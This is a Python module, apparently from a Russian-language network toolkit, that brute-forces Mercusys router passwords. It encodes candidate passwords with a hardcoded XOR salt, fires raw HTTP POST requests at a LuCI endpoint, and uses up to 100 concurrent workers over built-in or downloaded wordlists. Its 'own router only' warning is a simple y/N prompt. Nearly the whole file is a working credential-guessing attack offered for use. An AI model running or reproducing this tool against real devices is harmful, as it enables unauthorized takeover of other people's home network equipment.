import time
import asyncio
from .config import C
from .utils import header, ask, pause, beep, progress_line, progress_end
from .wordlists import load_lines, list_available

SALT = "RDpbLfCPsJZ7fiv"
ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

def encode_password(password):
    encoded = []
    for i, char in enumerate(password):
        xor_val = ord(char) ^ ord(SALT[i % len(SALT)])
        encoded_char = ALPHABET[xor_val % len(ALPHABET)]
        encoded.append(encoded_char)
    return "".join(encoded)

async def run_brute(ip, port, passwords, concurrency):
    total = len(passwords)
    print(f"\n{C.BOLD}[Mercusys TDDP Brute · WORKER POOL]{C.RESET} {ip}:{port}")
    print(f"  {C.DIM}Словарь: {total} паролей | Воркеров: {concurrency}{C.RESET}\n")

    queue = asyncio.Queue()
    for p in passwords:
        queue.put_nowait(p)

    found = []
    found_event = asyncio.Event()
    start_time = time.time()

    async def progress_monitor():
        while not found_event.is_set() and not queue.empty():
            elapsed = time.time() - start_time
            done = total - queue.qsize()
            speed = done / elapsed if elapsed > 0 else 0
            progress_line(f"[{done}/{total}] · скорость {speed:.0f} поп/с")
            await asyncio.sleep(0.5)

    async def worker():
        while not found_event.is_set():
            try:
                pwd = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
                
            enc_pass = encode_password(pwd)
            try:
                # Открываем сырое TCP-соединение
                reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=1.0)
                body = f"code=10&old_password={enc_pass}&new_password={enc_pass}"
                req = (
                    f"POST /cgi-bin/luci/;stok=/locale?form=country&operation=write HTTP/1.1\r\n"
                    f"Host: {ip}:{port}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{body}"
                ).encode()
                
                writer.write(req)
                await writer.drain()
                
                # Читаем ответ
                resp = await asyncio.wait_for(reader.read(1024), timeout=1.0)
                writer.close()
                try:
                    await writer.wait_closed()
                except:
                    pass
                
                # Проверяем статус и отсутствие ошибок
                if (b"HTTP/1.1 200" in resp or b"HTTP/1.0 200" in resp) and (b"error" not in resp.lower() or b'"code":0' in resp):
                    if not found_event.is_set():
                        found.append(pwd)
                        found_event.set()
                    return
            except Exception:
                pass
            finally:
                queue.task_done()

    mon_task = asyncio.create_task(progress_monitor())
    workers = [asyncio.create_task(worker()) for _ in range(concurrency)]
    
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        pass
    
    found_event.set()
    await mon_task
    progress_end()
    
    return found

def brute_router(ip, port=80, passwords=None, threads=50):
    if not passwords:
        return []
    try:
        return asyncio.run(run_brute(ip, port, passwords, threads))
    except KeyboardInterrupt:
        return []

def menu_router_brute():
    header("БРУТФОРС РОУТЕРА (Mercusys TDDP · WORKER POOL)")
    
    print(f"""{C.RED}{C.BOLD}
╔══════════════════════════════════════════════════════════╗
║  ⚠️  ТОЛЬКО ДЛЯ СВОЕГО РОУТЕРА!                           ║
║  Взлом чужих устройств — УГОЛОВНО НАКАЗУЕМ.              ║
╚══════════════════════════════════════════════════════════╝{C.RESET}
""")
    if ask("Я подтверждаю, что это мой роутер (y/N): ").lower() != 'y':
        print(f"{C.YELLOW}Отменено.{C.RESET}")
        pause()
        return
    
    ip = ask("IP роутера (Enter — 192.168.1.1): ") or "192.168.1.1"
    raw_port = ask("Порт [80]: ")
    try: port = int(raw_port) if raw_port else 80
    except: port = 80
    
    print(f"\n{C.BOLD}Выберите словарь:{C.RESET}")
    print("  1) Базовый (10 популярных паролей)")
    print("  2) Ввести свои (через запятую)")
    print("  3) Загрузить из файла (~/nettool/wordlists)")
    
    choice = ask("Выбор [1]: ") or '1'
    if choice == '1':
        passwords = ["admin", "password", "1234", "12345678", "qwerty", 
                     "mercusys", "MERCUSYS", "admin1", "password1", "123456789"]
    elif choice == '3':
        avail = list_available()
        if not avail:
            print(f"{C.RED}Папка wordlists пуста. Скачайте словари в меню 20.{C.RESET}")
            pause(); return
        for i, (name, size) in enumerate(avail, 1):
            print(f"  [{i}] {name:<30} {size//1024} КБ")
        raw = ask("Номер: ")
        try:
            idx = int(raw) - 1
            if 0 <= idx < len(avail):
                print(f"{C.DIM}Загрузка словаря...{C.RESET}")
                passwords = load_lines(avail[idx][0])
            else:
                return
        except:
            return
    else:
        raw_p = ask("Пароли (через запятую): ")
        passwords = [p.strip() for p in raw_p.split(',') if p.strip()]
        if not passwords:
            print(f"{C.RED}Пустой словарь.{C.RESET}"); pause(); return

    if not passwords:
        print(f"{C.RED}Словарь пуст.{C.RESET}")
        pause()
        return
        
    raw_t = ask("Одновременных воркеров [50] (макс 100): ")
    try: threads = max(1, min(int(raw_t) if raw_t else 50, 100))
    except: threads = 50
    
    print(f"\n{C.RED}Начинаю перебор (стабильный пул)...{C.RESET}")
    found = brute_router(ip, port, passwords, threads)
    
    print(f"\n{C.BOLD}{C.CYAN}{'═'*62}{C.RESET}")
    if found:
        print(f"{C.GREEN}{C.BOLD}✅ ПАРОЛЬ: {found[0]}{C.RESET}")
    else:
        print(f"{C.YELLOW}❌ Пароль не найден в словаре.{C.RESET}")
    pause()
